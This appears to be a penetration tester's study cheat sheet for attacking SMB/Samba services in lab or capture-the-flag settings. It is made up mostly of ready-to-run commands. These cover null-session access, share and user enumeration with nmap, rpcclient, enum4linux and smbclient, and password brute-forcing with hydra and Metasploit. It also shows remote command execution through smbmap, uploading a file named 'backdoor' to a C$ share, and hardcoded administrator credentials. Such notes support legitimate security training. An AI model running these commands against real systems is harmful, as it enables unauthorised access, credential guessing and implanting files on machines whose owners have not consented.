Access shares, got user name, brute force user and login again with bruteforced users.

Tips:- enum users and later brute force

## **`Listing Shares`**

- nmap --script smb-enum-shares.nse -p445 192.144.106.3
- auxiliary/scanner/smb/smb_enumshares
- enum4linux -S 192.144.106.3
- smbclient -L 192.144.106.3 -N

If username and password is provided, more enum can be done…

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/272c99bf-b353-4e45-a07f-42dcb1dd067c/98c54993-d95a-4c6a-b67a-73fd7ca40dab/image.png)

## **`NULL SESSION`**

rpcclient -U "" -N 192.126.66.3

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/272c99bf-b353-4e45-a07f-42dcb1dd067c/509a3d9b-3ec1-4f4c-a718-4fb7db20e723/Untitled.png)

srvinfo = gives server info in RPC CLIENT

enumdomusers = enum users

lookupnames admin = sid of admin

## **`ENUM4LINUX`**

**`enum4linux -a 1.1.1.1 = Automated script for enumuration`**

## **`NMAP`**

- **`ls -al /usr/share/nmap/scripts/ | grep smb`**
- nmap -p 445 --script smb-os-discovery 10.10.125.84
- **`nmap -p 445 --script smb* 10.10.125.84` ⇒runs all script**
- nmap -p 445 --script smb-enum-shares 10.10.125.84 ⇒shares
- nmap -p445 --script smb-protocols 10.0.17.200
- nmap -p445 --script smb-security-mode 10.0.17.200

## **`Enum Using Credentials`**

- nmap -p445 --script smb-security-mode 10.0.17.200
- nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.27.87
- nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.27.87
- nmap -p445 --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.27.87
- nmap -p445 --script smb-enum-domains--script-args smbusername=administrator,smbpassword=smbserver_771 10.2.27.87
- --script smb-enum-groups
- --script smb-enum-domains
- --script smb-enum-services
- nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.27.87

## **`SMBCLIENT`**

smbclient -L \\\\192.126.66.3\\ -N =Nullsession, list shares

smbclient -L \\\\[10.10.125.84](notion://10.10.125.84/)\\=list shares

smbclient \\\\[10.10.125.84](notion://10.10.125.84/)\\ADMIN$ = connect to the share with annon

smbclient \\\\[10.10.125.84](notion://10.10.125.84/)\\IPC$ = connect to IPC

smbclient [//192.208.227.3/public](notion://192.208.227.3/public) -N => connected

smbclient [//10.10.125.84/BillySMB](notion://10.10.125.84/BillySMB) ⇒ To access SMB Shares

smbclient [//10.10.125.84/BillySMB](notion://10.10.125.84/BillySMB) ⇒ To access SMB Shares

smbclient -L 192.212.251.3 -U jane ⇒ List Shares, better give passsword

smbclient [//192.212.251.3/jane](notion://192.212.251.3/jane) -U jane ⇒ Access jane share using username jane.

**`TIP:` Sometime jane share wont be listed but can be viewed using above command.**

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/272c99bf-b353-4e45-a07f-42dcb1dd067c/66a30db5-971f-49c1-8f20-71dae61e5c7b/Untitled.png)

GET and PUT command will work for downloading and uploading files.

## **`SMBMap:`**

Allows users to enumerate samba share Allows file upload/download/delete Permission enumeration (writable share, meet Metasploit) etc.

- smbmap -u guest -p "" -d . -H 10.10.125.84 =shares also
- smbmap -u administrator -p smbserver_771 -d . -H 10.0.28.123 = admin will have more privilege
- smbmap -H 10.0.28.123 -u administrator -p smbserver_771 -x 'ipconfig’ = can be used to run commands
- smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' -L = List drives on local host
- smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' -r 'C$’ = List content of C
- smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' --upload '/root/backdoor' 'C$\backdoor' ⇒ Upload File in C drive
- smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' -r 'C$’ ⇒ Verify upload
- smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' --download 'C$\flag.txt' ⇒ Download File
- smbmap -H 192.212.251.3 -u admin -p password1 ⇒ ONCE CRED IS KNOWN

## **`SAMBA`**

nmap --script smb-os-discovery.nse -p 445 192.126.66.3

auxiliary/scanner/smb/smb_version

auxiliary/scanner/smb/smb_enumusers

auxiliary/scanner/smb/smb_enumshares

## **`BRUTEFORCE`**

- auxiliary/scanner/smb/smb_login
- hydra -l admin -P <filename> <ip> <protocol(smb)>
    - hydra -l admin -P /usr/share/password.txt 10.10.10.10 smb